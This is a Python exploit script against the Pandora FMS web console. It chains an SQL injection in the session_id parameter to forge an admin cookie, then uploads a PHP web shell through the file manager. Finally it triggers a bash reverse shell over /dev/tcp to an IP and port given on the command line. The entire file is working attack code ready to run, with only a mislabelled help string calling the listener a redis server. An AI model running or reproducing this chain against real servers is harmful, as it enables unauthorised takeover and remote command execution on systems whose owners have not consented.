import requests
import string
import random
import argparse

letters = string.ascii_lowercase
file_name = ''.join(random.choice(letters) for i in range(10)) + '.php'

params = (
    ('sec', 'gsetup'),
    ('sec2', 'godmode/setup/file_manager'),
)

data = '-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="{file_name}"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[\'test\']);?>\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'.format(file_name = file_name)

def sqlInjection(url):
    cookies = {}
    r = requests.get(url + "/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO")
    if r.status_code == 200:
        cookie = r.cookies.get('PHPSESSID')
        print("[+] Admin Session Cookie: {cookie}".format(cookie=cookie))
        cookies = {
            'PHPSESSID': cookie
        }
        return cookies
    else:
        print("[!] Unable to obtain session cookie!")
        return None

def fileExploit(url):
    cookies = sqlInjection(url)
    if cookies is None:
        return False
    host = url.replace("https://","")
    host = host.replace("http://","")   
    headers = {
        'Host': host,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=---------------------------308045185511758964171231871874',
        'Content-Length': '1289',
        'Connection': 'close',
        'Referer': f'http://{host}/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    }
    print("[+] Sending payload...")
    print("[+] Uploaded payload as {file_name}".format(file_name=file_name))
    try:
        resp = requests.post('{url}/pandora_console/index.php'.format(url=url), headers=headers, params=params, cookies=cookies, data=data, verify=False)    
        status_code = resp.status_code
        print("[+] Response: {status_code}".format(status_code=status_code)) 
        return True
    except Exception as e:
        print("[!] An error has occured. Error: {e}".format(e=e))
        return False 

def reverseShell(url, ip, port):
    print("[+] Dropping Reverse Shell....")
    payload = "%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%27".format(ip=ip, port=port)
    try:
        requests.get(url + "/pandora_console/images/{file_name}?test={payload}".format(file_name=file_name, payload=payload), timeout = 5)
    except requests.exceptions.Timeout:
        print("[+] Reverse shell dropped at {ip}:{port}".format(ip=ip, port=port))
    except Exception as e:
        print("[+] An error occurred. Error: {e}".format(e=e))
        
def main(url, ip, port):
    if ('http://' not in url) and ("https://" not in url):
        print("[!] Missing protocol in url! Please add in http:// or https:// to the url")
        return
    elif fileExploit(url) == True:
        print("[+] Target url : {url}".format(url=url))
        reverseShell(url, ip, port)
    else:
        return 
        
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', help='target URL')
    parser.add_argument('-i', '--ip', help='IP address of redis server')
    parser.add_argument('-p', '--port', help='Port of redis server')
    args = parser.parse_args()
    main(args.url,args.ip, args.port)
